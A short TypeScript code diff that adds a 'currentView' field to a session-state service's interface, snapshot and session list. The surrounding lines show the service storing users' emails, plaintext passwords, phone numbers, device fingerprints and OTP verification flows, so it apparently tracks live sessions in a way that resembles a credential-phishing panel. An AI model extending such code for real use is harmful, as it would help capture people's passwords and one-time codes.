@@ -27,6 +27,7 @@ export interface SessionHistory {
   fingerprint: UserFingerprint;
   data: any;
   stage?: string;
+  currentView?: string;
   resendRequested?: boolean;
   isPinned?: boolean;
   verificationFlow?: 'otp' | 'app' | 'both';
@@ -490,6 +491,7 @@ export class StateService {
       return {
           sessionId: this.sessionId(),
           timestamp: this.startTime(),
+          currentView: this.currentView(),
           email: this.email(),
           password: this.password(),
           phoneNumber: this.phoneNumber(),
@@ -635,6 +637,7 @@ export class StateService {
                 name: `${s.firstName || ''} ${s.lastName || ''}`,
                 status: s.status || 'Active',
                 stage: s.stage,
+                currentView: s.currentView,
                 fingerprint: s.fingerprint,
                 data: s,
                 resendRequested: s.resendRequested,
